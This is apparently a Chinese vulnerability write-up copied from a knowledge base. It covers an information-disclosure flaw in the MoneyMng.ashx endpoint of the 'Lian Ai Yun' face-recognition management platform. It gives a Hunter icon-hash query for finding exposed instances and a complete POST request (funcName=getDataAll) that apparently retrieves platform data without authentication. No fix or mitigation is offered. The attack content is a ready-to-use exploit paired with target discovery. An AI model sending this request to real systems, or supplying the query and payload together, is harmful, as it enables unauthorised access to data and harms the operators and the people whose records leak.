# 脸爱云一脸通智慧管理平台MoneyMng存在信息泄露漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">脸爱云一脸通智慧管理平台是一套功能强大，运行稳定，操作简单方便，用户界面美观，轻松统计数据的一脸通系统。无需安装，只需在后台配置即可在浏览器登录。脸爱云一脸通智慧管理平台MoneyMng存在信息泄露漏洞。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ 脸爱云一脸通智慧管理平台

# 三、资产测绘
+ hunter`web.icon=="4f0be080512ee0b45fc90ff894b6ba60"`
+ 特征

![1700642739314-bb174ac2-c85b-471b-90e8-ed6c02ba5c28.png](./img/pmeeBVqtGnp0G6v2/1700642739314-bb174ac2-c85b-471b-90e8-ed6c02ba5c28-869505.png)

# 四、漏洞复现
```java
POST /MoneyMng.ashx HTTP/1.1
Host: 
Content-Length: 19
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

funcName=getDataAll
```

![1714290083008-d3dbe18b-ab5a-4387-8d2d-aacb9473959b.png](./img/pmeeBVqtGnp0G6v2/1714290083008-d3dbe18b-ab5a-4387-8d2d-aacb9473959b-239033.png)



> 更新: 2024-04-28 15:45:25  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/tqe4b2kisd87ki3g>